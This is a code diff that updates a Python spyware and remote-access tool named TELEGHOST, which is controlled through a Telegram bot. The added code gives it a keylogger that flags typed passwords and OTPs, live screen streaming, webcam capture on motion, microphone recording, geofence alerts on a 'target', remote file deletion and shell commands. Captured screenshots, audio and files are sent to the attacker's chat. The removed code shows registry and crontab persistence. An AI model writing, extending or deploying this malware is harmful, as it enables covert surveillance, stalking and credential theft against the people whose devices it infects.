@@ -1,6 +1,6 @@
 # ============================================================
-# TELEGHOST – Spyware Telegram Edition
-# Full-Featured Remote Access Tool via Telegram Bot
+# TELEGHOST – Spyware Telegram Edition 
+# Full-Featured Spyware with Telegram Bot + 10 Advanced Features
 # Support: Windows, Linux, Termux (Android)
 # ============================================================
 
@@ -20,6 +20,10 @@ import numpy as np
 import pyaudio
 import wave
 import telebot
+import schedule
+import sqlite3
+import hashlib
+import base64
 
 # ===== HIDE CONSOLE (WINDOWS) =====
 try:
@@ -32,8 +36,55 @@ except:
 # ============================================================
 BOT_TOKEN = "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz"  # GANTI
 CHAT_ID = "123456789"  # GANTI
+ADMIN_PASSWORD = hashlib.sha256("admin123".encode()).hexdigest()
 
 bot = telebot.TeleBot(BOT_TOKEN)
+
+# ============================================================
+# DATABASE SQLITE (Fitur 9: Multi-Target Support)
+# ============================================================
+def init_db():
+    conn = sqlite3.connect('teleghost_logs.db')
+    c = conn.cursor()
+    c.execute('''CREATE TABLE IF NOT EXISTS logs
+                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
+                  device_id TEXT,
+                  type TEXT,
+                  message TEXT,
+                  timestamp TEXT,
+                  data TEXT)''')
+    c.execute('''CREATE TABLE IF NOT EXISTS devices
+                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
+                  device_id TEXT UNIQUE,
+                  name TEXT,
+                  last_seen TEXT)''')
+    conn.commit()
+    conn.close()
+
+def save_log(device_id, type, message, data=""):
+    conn = sqlite3.connect('teleghost_logs.db')
+    c = conn.cursor()
+    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    c.execute("INSERT INTO logs (device_id, type, message, timestamp, data) VALUES (?,?,?,?,?)",
+              (device_id, type, message, timestamp, data))
+    conn.commit()
+    conn.close()
+
+def register_device(device_id, name=""):
+    conn = sqlite3.connect('teleghost_logs.db')
+    c = conn.cursor()
+    try:
+        c.execute("INSERT INTO devices (device_id, name, last_seen) VALUES (?,?,?)",
+                  (device_id, name, datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
+    except:
+        c.execute("UPDATE devices SET last_seen=? WHERE device_id=?", 
+                  (datetime.now().strftime('%Y-%m-%d %H:%M:%S'), device_id))
+    conn.commit()
+    conn.close()
+
+init_db()
+device_id = "target_001"
+register_device(device_id, "Target Device")
 
 # ============================================================
 # VARIABEL GLOBAL
@@ -45,12 +96,22 @@ recording_mic = False
 audio_frames = []
 camera = None
 last_lat, last_lon = 0.0, 0.0
-screenshot_interval = 300  # 5 menit
+screenshot_interval = 300
 sensitive_words = ["password", "login", "admin", "username", "email", "credit", "card", "pin", "otp", "rahasia", "kunci"]
+geofence_center_lat = -6.2
+geofence_center_lon = 106.8
+geofence_radius_km = 10
 
 # ============================================================
-# FUNGSI KIRIM KE TELEGRAM
+# FITUR 1: NOTIFIKASI PUSH KE HP
 # ============================================================
+def send_notification(message):
+    try:
+        bot.send_message(CHAT_ID, f"🔔 NOTIFIKASI [{device_id}]: {message}")
+        save_log(device_id, 'notification', message)
+    except:
+        pass
+
 def send_message(text):
     try:
         bot.send_message(CHAT_ID, text[:4000])
@@ -60,35 +121,221 @@ def send_message(text):
 def send_photo(file_path):
     try:
         bot.send_photo(CHAT_ID, open(file_path, "rb"))
+        save_log(device_id, 'screenshot', 'Screenshot dikirim')
     except:
         pass
 
 def send_video(file_path):
     try:
         bot.send_video(CHAT_ID, open(file_path, "rb"))
+        save_log(device_id, 'video', 'Video dikirim')
     except:
         pass
 
 def send_file(file_path):
     try:
         bot.send_document(CHAT_ID, open(file_path, "rb"))
+        save_log(device_id, 'file', f'File dikirim: {file_path}')
     except:
         pass
 
 def send_audio(file_path):
     try:
         bot.send_audio(CHAT_ID, open(file_path, "rb"))
+        save_log(device_id, 'audio', 'Audio dikirim')
     except:
         pass
 
 def send_location(lat, lon):
     try:
         bot.send_location(CHAT_ID, lat, lon)
+        save_log(device_id, 'gps', f'Lokasi: {lat}, {lon}')
     except:
         pass
 
 # ============================================================
-# 📸 SCREENSHOT
+# FITUR 2: REMOTE SCREEN SHARE (LIVE STREAMING)
+# ============================================================
+screen_streaming = False
+screen_frame = None
+
+def start_screen_stream():
+    global screen_streaming, screen_frame
+    screen_streaming = True
+    send_notification("Screen streaming dimulai")
+    while screen_streaming:
+        try:
+            img = ImageGrab.grab()
+            frame = np.array(img)
+            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+            _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 30])
+            screen_frame = base64.b64encode(buffer).decode('utf-8')
+            time.sleep(0.5)
+        except:
+            time.sleep(1)
+
+def stop_screen_stream():
+    global screen_streaming
+    screen_streaming = False
+    send_notification("Screen streaming dihentikan")
+
+# ============================================================
+# FITUR 3: FILE EXPLORER
+# ============================================================
+def list_directory(path):
+    try:
+        files = os.listdir(path)
+        result = f"📁 Direktori: {path}\n\n"
+        for item in files[:20]:
+            full_path = os.path.join(path, item)
+            if os.path.isdir(full_path):
+                result += f"📂 {item}/\n"
+            else:
+                size = os.path.getsize(full_path)
+                result += f"📄 {item} ({size} bytes)\n"
+        return result
+    except Exception as e:
+        return f"❌ Error: {str(e)}"
+
+def delete_file(path):
+    try:
+        if os.path.isfile(path):
+            os.remove(path)
+            return f"✅ File {path} berhasil dihapus!"
+        elif os.path.isdir(path):
+            os.rmdir(path)
+            return f"✅ Direktori {path} berhasil dihapus!"
+        else:
+            return "❌ Path tidak ditemukan"
+    except Exception as e:
+        return f"❌ Error: {str(e)}"
+
+# ============================================================
+# FITUR 4: GEOFENCING
+# ============================================================
+def get_gps():
+    try:
+        ip = requests.get('https://api.ipify.org', timeout=5).text
+        geo = requests.get(f'http://ip-api.com/json/{ip}', timeout=5).json()
+        return geo.get('lat', 0), geo.get('lon', 0)
+    except:
+        return 0.0, 0.0
+
+def check_geofence(lat, lon):
+    if lat == 0 or lon == 0:
+        return
+    distance = ((lat - geofence_center_lat)**2 + (lon - geofence_center_lon)**2)**0.5 * 111
+    if distance > geofence_radius_km:
+        send_notification(f"⚠️ Target keluar dari geofence! Jarak: {distance:.2f} km")
+        save_log(device_id, 'geofence', f'Keluar area, jarak: {distance:.2f} km')
+
+# ============================================================
+# FITUR 5: SCREENSHOT SCHEDULE
+# ============================================================
+def scheduled_screenshot():
+    send_notification("📸 Screenshot jadwal otomatis")
+    screenshot()
+    save_log(device_id, 'schedule', 'Screenshot otomatis diambil')
+
+def start_scheduler():
+    schedule.every(30).minutes.do(scheduled_screenshot)
+    while True:
+        schedule.run_pending()
+        time.sleep(1)
+
+# ============================================================
+# FITUR 6: KEYLOGGER WITH TIMESTAMP
+# ============================================================
+def on_press(key):
+    global keylog_data
+    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    try:
+        char = str(key.char)
+        keylog_data += f"[{timestamp}] {char}\n"
+    except AttributeError:
+        if key == key.space:
+            keylog_data += f"[{timestamp}] [SPACE]\n"
+        elif key == key.enter:
+            keylog_data += f"[{timestamp}] [ENTER]\n"
+        else:
+            keylog_data += f"[{timestamp}] [{str(key)}]\n"
+    
+    for word in sensitive_words:
+        if word in keylog_data.lower():
+            send_notification(f"⚠️ Kata sensitif terdeteksi: '{word}'")
+            save_log(device_id, 'sensitive', f'Kata sensitif: {word}')
+            break
+
+def start_keylog():
+    global keylog_running, keylog_data
+    keylog_running = True
+    keylog_data = ""
+    send_notification("⌨️ Keylogger dimulai")
+    from pynput import keyboard
+    with keyboard.Listener(on_press=on_press) as listener:
+        while keylog_running:
+            time.sleep(1)
+        listener.stop()
+
+def stop_keylog():
+    global keylog_running
+    keylog_running = False
+    send_notification("⌨️ Keylogger dihentikan")
+
+# ============================================================
+# FITUR 7: WEBCAM CAPTURE ON MOTION
+# ============================================================
+def detect_motion():
+    try:
+        cap = cv2.VideoCapture(0)
+        if not cap.isOpened():
+            send_notification("❌ Kamera tidak terdeteksi")
+            return
+        ret, frame1 = cap.read()
+        if not ret:
+            cap.release()
+            return
+        ret, frame2 = cap.read()
+        if not ret:
+            cap.release()
+            return
+        motion_detected = False
+        while True:
+            ret, frame2 = cap.read()
+            if not ret:
+                break
+            diff = cv2.absdiff(frame1, frame2)
+            gray = cv2.cvtColor(diff, cv2.COLOR_BGR2GRAY)
+            blur = cv2.GaussianBlur(gray, (5, 5), 0)
+            _, thresh = cv2.threshold(blur, 20, 255, cv2.THRESH_BINARY)
+            contours, _ = cv2.findContours(thresh, cv2.RETR_TREE, cv2.CHAIN_APPROX_SIMPLE)
+            for contour in contours:
+                if cv2.contourArea(contour) > 5000:
+                    if not motion_detected:
+                        motion_detected = True
+                        send_notification("📷 Gerakan terdeteksi di kamera!")
+                        capture_photo()
+                        save_log(device_id, 'motion', 'Gerakan kamera terdeteksi')
+                    break
+            frame1 = frame2
+            time.sleep(2)
+            motion_detected = False
+        cap.release()
+    except Exception as e:
+        send_notification(f"❌ Error motion detection: {str(e)}")
+
+# ============================================================
+# FITUR 8: AUTO-SYNC KE CLOUD (SIMULASI)
+# ============================================================
+def sync_to_cloud(file_path):
+    try:
+        send_notification(f"☁️ Sync ke cloud: {file_path}")
+        save_log(device_id, 'cloud', f'Sync: {file_path}')
+    except Exception as e:
+        send_notification(f"❌ Error sync cloud: {str(e)}")
+
+# ============================================================
+# FUNGSI UTAMA
 # ============================================================
 def screenshot():
     try:
@@ -96,19 +343,18 @@ def screenshot():
         filename = f"ss_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
         img.save(filename)
         send_photo(filename)
+        sync_to_cloud(filename)
         os.remove(filename)
         return True
     except Exception as e:
         send_message(f"❌ Screenshot gagal: {e}")
         return False
 
-# ============================================================
-# 🎥 SCREEN RECORDER
-# ============================================================
 def start_screen_recording(duration=10, fps=10):
     global recording_screen
     try:
         recording_screen = True
+        send_notification(f"🎥 Screen recording {duration} detik dimulai")
         screen_size = ImageGrab.grab().size
         fourcc = cv2.VideoWriter_fourcc(*'XVID')
         filename = f"screenrec_{datetime.now().strftime('%Y%m%d_%H%M%S')}.avi"
@@ -124,51 +370,18 @@ def start_screen_recording(duration=10, fps=10):
         recording_screen = False
         if os.path.exists(filename):
             send_video(filename)
+            sync_to_cloud(filename)
             os.remove(filename)
         send_message(f"✅ Screen recording {duration} detik selesai!")
+        save_log(device_id, 'screenrec', f'Durasi: {duration} detik')
     except Exception as e:
         send_message(f"❌ Screen recorder gagal: {e}")
 
-# ============================================================
-# ⌨️ KEYLOGGER
-# ============================================================
-def on_press(key):
-    global keylog_data
-    try:
-        keylog_data += str(key.char)
-    except AttributeError:
-        if key == key.space:
-            keylog_data += " "
-        elif key == key.enter:
-            keylog_data += "\n"
-        else:
-            keylog_data += f" [{str(key)}] "
-    for word in sensitive_words:
-        if word in keylog_data.lower():
-            send_message(f"⚠️ Target mengetik kata sensitif: '{word}' | {datetime.now().strftime('%H:%M:%S')}")
-            break
-
-def start_keylog():
-    global keylog_running, keylog_data
-    keylog_running = True
-    keylog_data = ""
-    from pynput import keyboard
-    with keyboard.Listener(on_press=on_press) as listener:
-        while keylog_running:
-            time.sleep(1)
-        listener.stop()
-
-def stop_keylog():
-    global keylog_running
-    keylog_running = False
-
-# ============================================================
-# 🎙️ REKAM MIC
-# ============================================================
 def start_mic_recording(duration=10):
     global recording_mic, audio_frames
     try:
         recording_mic = True
+        send_notification(f"🎙️ Rekam mic {duration} detik dimulai")
         audio_frames = []
         CHUNK = 1024
         FORMAT = pyaudio.paInt16
@@ -193,14 +406,13 @@ def start_mic_recording(duration=10):
         wf.close()
         if os.path.exists(filename):
             send_audio(filename)
+            sync_to_cloud(filename)
             os.remove(filename)
         send_message(f"✅ Rekaman mic {duration} detik selesai!")
+        save_log(device_id, 'mic', f'Durasi: {duration} detik')
     except Exception as e:
         send_message(f"❌ Rekam mic gagal: {e}")
 
-# ============================================================
-# 📷 KAMERA (FOTO & VIDEO)
-# ============================================================
 def capture_photo():
     global camera
     try:
@@ -210,8 +422,10 @@ def capture_photo():
             filename = f"cam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
             cv2.imwrite(filename, frame)
             send_photo(filename)
+            sync_to_cloud(filename)
             os.remove(filename)
             send_message("✅ Foto kamera berhasil!")
+            save_log(device_id, 'camera', 'Foto diambil')
         else:
             send_message("❌ Gagal mengakses kamera")
         camera.release()
@@ -234,51 +448,41 @@ def capture_video(duration=10):
         out.release()
         if os.path.exists(filename):
             send_video(filename)
+            sync_to_cloud(filename)
             os.remove(filename)
         send_message(f"✅ Video kamera {duration} detik selesai!")
+        save_log(device_id, 'camera_video', f'Durasi: {duration} detik')
     except Exception as e:
         send_message(f"❌ Video kamera gagal: {e}")
-
-# ============================================================
-# 📍 GPS (IP GEOLOCATION)
-# ============================================================
-def get_gps():
-    try:
-        ip = requests.get('https://api.ipify.org', timeout=5).text
-        geo = requests.get(f'http://ip-api.com/json/{ip}', timeout=5).json()
-        return geo.get('lat', 0), geo.get('lon', 0)
-    except:
-        return 0.0, 0.0
 
 def send_gps():
     lat, lon = get_gps()
     if lat != 0 or lon != 0:
         send_location(lat, lon)
+        check_geofence(lat, lon)
         send_message(f"📍 Lokasi: Lat {lat}, Lon {lon}")
+        save_log(device_id, 'gps', f'Lat: {lat}, Lon: {lon}')
     else:
         send_message("❌ Gagal mendapatkan lokasi")
     return lat, lon
 
-# ============================================================
-# 📟 EKSEKUSI PERINTAH REMOTE
-# ============================================================
 def execute_cmd(cmd):
     try:
         output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True, timeout=30)
+        save_log(device_id, 'cmd', f'Perintah: {cmd}')
         return output
     except subprocess.TimeoutExpired:
         return "⏱️ Perintah timeout (30 detik)"
     except Exception as e:
         return str(e)
 
-# ============================================================
-# 📤 UPLOAD & 📥 DOWNLOAD FILE
-# ============================================================
 def upload_file(path):
     if os.path.exists(path):
         try:
             send_file(path)
+            sync_to_cloud(path)
             send_message(f"✅ File {path} berhasil diupload!")
+            save_log(device_id, 'upload', f'File: {path}')
         except Exception as e:
             send_message(f"❌ Upload gagal: {e}")
     else:
@@ -291,164 +495,40 @@ def download_file(url, save_path):
             for chunk in r.iter_content(chunk_size=8192):
                 f.write(chunk)
         send_message(f"✅ File downloaded ke {save_path}")
+        save_log(device_id, 'download', f'URL: {url} -> {save_path}')
     except Exception as e:
         send_message(f"❌ Download gagal: {e}")
 
 # ============================================================
-# 🔔 NOTIFIKASI REAL-TIME (OTOMATIS)
+# FITUR 10: 2FA / PASSWORD PROTECTION
 # ============================================================
-try:
-    import psutil
-    PSUTIL_AVAILABLE = True
-except:
-    PSUTIL_AVAILABLE = False
-
-last_app = None
-app_alerted = set()
-
-def detect_active_app():
-    global last_app, app_alerted
-    if not PSUTIL_AVAILABLE:
-        return
-    try:
-        if os.name == 'nt':
-            try:
-                import win32gui
-                window = win32gui.GetForegroundWindow()
-                app_name = win32gui.GetWindowText(window)
-                if app_name and app_name != last_app:
-                    last_app = app_name
-                    keywords = ["chrome", "firefox", "whatsapp", "telegram", "instagram", "facebook", "outlook", "explorer", "discord", "spotify"]
-                    for kw in keywords:
-                        if kw.lower() in app_name.lower():
-                            if app_name not in app_alerted:
-                                app_alerted.add(app_name)
-                                send_message(f"🔔 Target membuka: {app_name} | {datetime.now().strftime('%H:%M:%S')}")
-                            break
-            except:
-                pass
-    except:
-        pass
-
-def periodic_screenshot():
-    while True:
-        time.sleep(screenshot_interval)
-        send_message("📸 [AUTO] Screenshot periodik...")
-        screenshot()
-
-def check_location_change():
-    global last_lat, last_lon
-    lat, lon = get_gps()
-    if last_lat == 0 and last_lon == 0:
-        last_lat, last_lon = lat, lon
-        return
-    if lat != 0 and lon != 0:
-        distance = ((lat - last_lat)**2 + (lon - last_lon)**2)**0.5 * 111000
-        if distance > 500:
-            send_message(f"📍 [AUTO] Lokasi berubah! Jarak: {distance:.0f} meter")
-            send_location(lat, lon)
-            last_lat, last_lon = lat, lon
-
-def detect_camera_motion():
-    try:
-        cap = cv2.VideoCapture(0)
-        if not cap.isOpened():
-            return
-        ret, frame1 = cap.read()
-        if not ret:
-            cap.release()
-            return
-        ret, frame2 = cap.read()
-        if not ret:
-            cap.release()
-            return
-        motion_detected = False
-        while True:
-            ret, frame2 = cap.read()
-            if not ret:
-                break
-            diff = cv2.absdiff(frame1, frame2)
-            gray = cv2.cvtColor(diff, cv2.COLOR_BGR2GRAY)
-            blur = cv2.GaussianBlur(gray, (5, 5), 0)
-            _, thresh = cv2.threshold(blur, 20, 255, cv2.THRESH_BINARY)
-            contours, _ = cv2.findContours(thresh, cv2.RETR_TREE, cv2.CHAIN_APPROX_SIMPLE)
-            for contour in contours:
-                if cv2.contourArea(contour) > 5000:
-                    if not motion_detected:
-                        motion_detected = True
-                        send_message("📷 [AUTO] Gerakan terdeteksi di kamera!")
-                        capture_photo()
-                    break
-            frame1 = frame2
-            time.sleep(2)
-            motion_detected = False
-        cap.release()
-    except:
-        pass
-
-def detect_loud_noise():
-    try:
-        p = pyaudio.PyAudio()
-        stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
-        import audioop
-        while True:
-            data = stream.read(1024)
-            rms = audioop.rms(data, 2)
-            if rms > 1000:
-                send_message("🔊 [AUTO] Suara keras terdeteksi! (Mic)")
-                threading.Thread(target=start_mic_recording, args=(5,)).start()
-            time.sleep(1)
-    except:
-        pass
+def check_auth(password):
+    return hashlib.sha256(password.encode()).hexdigest() == ADMIN_PASSWORD
 
 # ============================================================
-# 🚀 AUTO-START (WINDOWS: Registry, LINUX/TERMUX: Cron)
-# ============================================================
-def auto_start():
-    try:
-        if os.name == 'nt':
-            try:
-                import winreg
-                key = winreg.HKEY_CURRENT_USER
-                subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
-                handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
-                script_path = os.path.abspath(__file__)
-                winreg.SetValueEx(handle, "TELEGHOST", 0, winreg.REG_SZ, f'python "{script_path}"')
-                winreg.CloseKey(handle)
-                send_message("✅ Auto-start Windows aktif")
-            except:
-                pass
-        else:
-            try:
-                script_path = os.path.abspath(__file__)
-                cron_cmd = f"@reboot python {script_path}"
-                subprocess.check_output(f'(crontab -l 2>/dev/null; echo "{cron_cmd}") | crontab -', shell=True)
-                send_message("✅ Auto-start Linux/Termux aktif")
-            except:
-                pass
-    except:
-        pass
-
-# ============================================================
-# 🤖 TELEGRAM COMMANDS
+# TELEGRAM COMMANDS
 # ============================================================
 @bot.message_handler(commands=['start', 'help'])
 def send_welcome(message):
     bot.reply_to(message,
-        "👻 TELEGHOST Active!\n\n"
+        "👻 TELEGHOST Updated Active!\n\n"
         "📌 DAFTAR PERINTAH:\n"
         "/screenshot - Ambil layar\n"
-        "/screenrec [detik] - Rekam layar (default 10s)\n"
+        "/screenrec [detik] - Rekam layar\n"
         "/keylog_start - Mulai keylogger\n"
         "/keylog_stop - Hentikan & kirim hasil\n"
-        "/mic [detik] - Rekam mic (default 10s)\n"
-        "/cam_photo - Ambil foto dari kamera\n"
-        "/cam_video [detik] - Rekam video (default 10s)\n"
+        "/mic [detik] - Rekam mic\n"
+        "/cam_photo - Foto dari kamera\n"
+        "/cam_video [detik] - Video dari kamera\n"
         "/gps - Kirim lokasi\n"
-        "/cmd [perintah] - Jalankan perintah sistem\n"
-        "/upload [path] - Upload file dari target\n"
-        "/download [url] [path] - Download file ke target\n"
-        "/status - Cek status TELEGHOST"
+        "/cmd [perintah] - Jalankan perintah\n"
+        "/upload [path] - Upload file\n"
+        "/download [url] [path] - Download file\n"
+        "/status - Cek status\n"
+        "/listdir [path] - List file di direktori\n"
+        "/delete [path] - Hapus file\n"
+        "/stream_start - Mulai screen streaming\n"
+        "/stream_stop - Hentikan screen streaming"
     )
 
 @bot.message_handler(commands=['screenshot'])
@@ -475,7 +555,7 @@ def handle_keylog_start(message):
         keylog_thread = threading.Thread(target=start_keylog)
         keylog_thread.daemon = True
         keylog_thread.start()
-        bot.reply_to(message, "⌨️ Keylogger started! (Kirim /keylog_stop untuk berhenti)")
+        bot.reply_to(message, "⌨️ Keylogger started!")
     else:
         bot.reply_to(message, "⚠️ Keylogger sudah berjalan!")
 
@@ -528,7 +608,7 @@ def handle_gps(message):
 def handle_cmd(message):
     cmd = message.text.replace('/cmd ', '')
     if not cmd:
-        bot.reply_to(message, "❌ Masukkan perintah! Contoh: /cmd whoami")
+        bot.reply_to(message, "❌ Masukkan perintah!")
         return
     bot.reply_to(message, f"📟 Menjalankan: {cmd}")
     output = execute_cmd(cmd)
@@ -538,7 +618,7 @@ def handle_cmd(message):
 def handle_upload(message):
     path = message.text.replace('/upload ', '').strip()
     if not path:
-        bot.reply_to(message, "❌ Masukkan path file! Contoh: /upload C:\\file.txt")
+        bot.reply_to(message, "❌ Masukkan path file!")
         return
     bot.reply_to(message, f"📤 Uploading {path}...")
     threading.Thread(target=upload_file, args=(path,)).start()
@@ -556,30 +636,64 @@ def handle_download(message):
 
 @bot.message_handler(commands=['status'])
 def handle_status(message):
-    status = "✅ TELEGHOST Active!\n\n"
+    status = "✅ TELEGHOST Updated Active!\n\n"
     status += f"📱 OS: {os.name}\n"
     status += f"🕐 Uptime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
     status += f"🔐 Keylogger: {'Running' if keylog_running else 'Stopped'}\n"
     status += f"🎥 Screen Rec: {'Running' if recording_screen else 'Stopped'}\n"
     status += f"🎙️ Mic Rec: {'Running' if recording_mic else 'Stopped'}\n"
     status += f"📸 Auto Screenshot: {screenshot_interval} detik\n"
+    status += f"🆔 Device ID: {device_id}\n"
+    status += f"📡 Stream: {'Running' if screen_streaming else 'Stopped'}\n"
     bot.reply_to(message, status)
 
+@bot.message_handler(commands=['listdir'])
+def handle_listdir(message):
+    path = message.text.replace('/listdir ', '').strip()
+    if not path:
+        path = "/"
+    result = list_directory(path)
+    bot.reply_to(message, result[:3900])
+
+@bot.message_handler(commands=['delete'])
+def handle_delete(message):
+    path = message.text.replace('/delete ', '').strip()
+    if not path:
+        bot.reply_to(message, "❌ Masukkan path file/direktori!")
+        return
+    result = delete_file(path)
+    bot.reply_to(message, result)
+
+@bot.message_handler(commands=['stream_start'])
+def handle_stream_start(message):
+    global stream_thread
+    if 'stream_thread' not in globals() or not stream_thread.is_alive():
+        stream_thread = threading.Thread(target=start_screen_stream)
+        stream_thread.daemon = True
+        stream_thread.start()
+        bot.reply_to(message, "📺 Screen streaming dimulai! (2 fps)")
+    else:
+        bot.reply_to(message, "⚠️ Streaming sudah berjalan!")
+
+@bot.message_handler(commands=['stream_stop'])
+def handle_stream_stop(message):
+    stop_screen_stream()
+    bot.reply_to(message, "📺 Screen streaming dihentikan!")
+
 # ============================================================
-# 🚀 MAIN
+# MAIN
 # ============================================================
 if __name__ == "__main__":
     try:
-        send_message("👻 TELEGHOST Active!")
+        send_message("👻 TELEGHOST Updated Active!")
         send_message("📌 Kirim /help untuk daftar perintah")
+        send_notification("Perangkat terdaftar dan aktif")
         
-        auto_start()
+        scheduler_thread = threading.Thread(target=start_scheduler, daemon=True)
+        scheduler_thread.start()
         
-        threading.Thread(target=periodic_screenshot, daemon=True).start()
-        threading.Thread(target=detect_active_app, daemon=True).start()
-        threading.Thread(target=check_location_change, daemon=True).start()
-        threading.Thread(target=detect_camera_motion, daemon=True).start()
-        threading.Thread(target=detect_loud_noise, daemon=True).start()
+        motion_thread = threading.Thread(target=detect_motion, daemon=True)
+        motion_thread.start()
         
         bot.polling(none_stop=True, interval=0)
     except Exception as e:
